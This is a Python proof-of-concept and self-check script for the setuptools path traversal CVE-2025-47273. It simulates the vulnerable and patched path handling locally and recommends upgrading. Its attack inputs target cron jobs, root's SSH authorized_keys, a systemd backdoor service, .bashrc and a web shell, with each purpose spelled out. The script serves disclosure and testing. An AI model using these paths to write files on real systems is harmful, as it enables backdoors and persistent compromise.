#!/usr/bin/env python3
"""
CVE-2025-47273 Proof of Concept
Path Traversal Vulnerability in Python setuptools

EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS ACTIVITIES

This POC demonstrates the path traversal vulnerability in setuptools < 78.1.1
affecting the PackageIndex._download_url() method.

Author: Security Research Team
Date: November 25, 2025
Target: setuptools < 78.1.1 (including Rocky Linux 8 version 39.2.0)
"""

import os
import sys
import tempfile


def print_banner():
    """Print POC banner"""
    banner = """
╔══════════════════════════════════════════════════════════════════╗
║           CVE-2025-47273 Path Traversal POC                      ║
║           Python setuptools Vulnerability                         ║
║                                                                    ║
║           CVSS: 8.8 (HIGH)                                       ║
║           CWE-22: Path Traversal                                 ║
╚══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def vulnerable_path_join(tmpdir, user_controlled_name):
    """
    Simulates the vulnerable code in setuptools 39.2.0
    Lines 800-808 in setuptools/package_index.py
    """
    name = user_controlled_name
    
    # Inadequate sanitization (line 800-801 in original)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')
    
    # Vulnerable path join (line 808 in original)
    # No validation that the result is within tmpdir
    filename = os.path.join(tmpdir, name)
    
    return filename


def fixed_path_join(tmpdir, user_controlled_name):
    """
    Demonstrates the proper fix implemented in setuptools 78.1.1
    """
    name = user_controlled_name
    
    # Basic sanitization
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')
    
    # Path join
    filename = os.path.join(tmpdir, name)
    
    # FIX: Validate that resolved path is within tmpdir
    resolved_filename = os.path.realpath(os.path.abspath(filename))
    resolved_tmpdir = os.path.realpath(os.path.abspath(tmpdir))
    
    if not resolved_filename.startswith(resolved_tmpdir + os.sep):
        raise ValueError(
            f"Path traversal detected: {name} resolves outside temporary directory"
        )
    
    # Additional check for absolute paths
    if os.path.isabs(name):
        raise ValueError(
            f"Absolute paths not allowed in package names: {name}"
        )
    
    return filename


def test_attack_vector(tmpdir, attack_name, malicious_input, expected_behavior):
    """Test a single attack vector"""
    print(f"\n{'=' * 70}")
    print(f"[{attack_name}]")
    print(f"{'=' * 70}")
    print(f"Input:     {malicious_input}")
    
    # Test vulnerable version
    try:
        vuln_result = vulnerable_path_join(tmpdir, malicious_input)
        normalized = os.path.normpath(vuln_result)
        
        print(f"Vulnerable Result: {vuln_result}")
        print(f"Normalized Path:   {normalized}")
        
        is_vulnerable = not normalized.startswith(tmpdir) or vuln_result.startswith('/')
        
        if is_vulnerable:
            print(f"Status:    ✗ VULNERABLE - {expected_behavior}")
            print(f"Impact:    Path escapes tmpdir - arbitrary file write possible")
        else:
            print(f"Status:    ✓ Contained within tmpdir")
            
    except Exception as e:
        print(f"Vulnerable Result: Exception - {e}")
        is_vulnerable = False
    
    # Test fixed version
    print(f"\n[Testing Fixed Version]")
    try:
        fixed_result = fixed_path_join(tmpdir, malicious_input)
        print(f"Fixed Result: {fixed_result}")
        print(f"Status:    ✓ Protected - Path validated successfully")
    except ValueError as e:
        print(f"Fixed Result: Blocked")
        print(f"Status:    ✓ Protected - {e}")
    except Exception as e:
        print(f"Fixed Result: Exception - {e}")
    
    return is_vulnerable


def demonstrate_vulnerabilities():
    """Run all POC attack vectors"""
    tmpdir = "/tmp/setuptools_test"
    vulnerabilities_found = []
    
    print_banner()
    print("Testing Path Traversal Vulnerabilities in setuptools")
    print(f"Test tmpdir: {tmpdir}\n")
    
    # Attack Vector 1: Absolute Path Bypass
    if test_attack_vector(
        tmpdir,
        "Attack 1: Absolute Path Bypass",
        "/etc/cron.d/malicious",
        "Writes to /etc/cron.d/ for scheduled code execution"
    ):
        vulnerabilities_found.append("Absolute Path Bypass")
    
    # Attack Vector 2: Root Directory Traversal
    if test_attack_vector(
        tmpdir,
        "Attack 2: Root Directory Access",
        "/root/.ssh/authorized_keys",
        "Writes SSH keys for backdoor access"
    ):
        vulnerabilities_found.append("Root Directory Access")
    
    # Attack Vector 3: System Configuration Override
    if test_attack_vector(
        tmpdir,
        "Attack 3: System Configuration Write",
        "/etc/systemd/system/backdoor.service",
        "Creates persistent systemd service"
    ):
        vulnerabilities_found.append("System Configuration Write")
    
    # Attack Vector 4: Nested Traversal (bypasses simple replacement)
    if test_attack_vector(
        tmpdir,
        "Attack 4: Nested Directory Traversal",
        "....//....//....//etc/passwd",
        "Uses nested traversal to bypass sanitization"
    ):
        vulnerabilities_found.append("Nested Directory Traversal")
    
    # Attack Vector 5: Home Directory Compromise
    if test_attack_vector(
        tmpdir,
        "Attack 5: User Home Directory Access",
        "/home/victim/.bashrc",
        "Modifies shell startup for persistence"
    ):
        vulnerabilities_found.append("Home Directory Access")
    
    # Attack Vector 6: Web Shell Deployment
    if test_attack_vector(
        tmpdir,
        "Attack 6: Web Root Access",
        "/var/www/html/shell.php",
        "Deploys web shell for remote access"
    ):
        vulnerabilities_found.append("Web Root Access")
    
    # Summary
    print(f"\n{'=' * 70}")
    print("SUMMARY")
    print(f"{'=' * 70}")
    print(f"Total Attack Vectors Tested: 6")
    print(f"Vulnerabilities Found: {len(vulnerabilities_found)}")
    
    if vulnerabilities_found:
        print(f"\n✗ SYSTEM IS VULNERABLE TO CVE-2025-47273")
        print(f"\nVulnerable Attack Vectors:")
        for i, vuln in enumerate(vulnerabilities_found, 1):
            print(f"  {i}. {vuln}")
        print(f"\nRECOMMENDATION:")
        print(f"  - Upgrade setuptools to version 78.1.1 or later")
        print(f"  - For Rocky Linux 8: yum update python-setuptools")
        print(f"  - Apply vendor-specific patches immediately")
    else:
        print(f"\n✓ System appears to be protected against CVE-2025-47273")
    
    print(f"\n{'=' * 70}\n")
    
    return len(vulnerabilities_found) > 0


def check_system_version():
    """Check if the system is running a vulnerable version of setuptools"""
    print("\n" + "=" * 70)
    print("SYSTEM VERSION CHECK")
    print("=" * 70)
    
    try:
        import setuptools
        version = setuptools.__version__
        print(f"Installed setuptools version: {version}")
        
        # Parse version
        major, minor, patch = map(int, version.split('.')[:3])
        
        # Check if vulnerable (< 78.1.1)
        is_vulnerable = (major < 78) or (major == 78 and minor < 1) or \
                       (major == 78 and minor == 1 and patch < 1)
        
        if is_vulnerable:
            print(f"Status: ✗ VULNERABLE")
            print(f"Recommendation: Upgrade to setuptools >= 78.1.1")
        else:
            print(f"Status: ✓ PATCHED")
            print(f"This version includes the CVE-2025-47273 fix")
            
        return is_vulnerable
        
    except Exception as e:
        print(f"Error checking version: {e}")
        return None


def main():
    """Main POC execution"""
    # Check system version first
    system_vulnerable = check_system_version()
    
    # Run POC demonstrations
    poc_vulnerable = demonstrate_vulnerabilities()
    
    # Exit with appropriate code
    if system_vulnerable or poc_vulnerable:
        print("⚠️  WARNING: System is vulnerable to CVE-2025-47273")
        print("    Take immediate action to patch this vulnerability\n")
        sys.exit(1)
    else:
        print("✓ System appears to be protected\n")
        sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nPOC interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n✗ Error during POC execution: {e}")
        sys.exit(1)

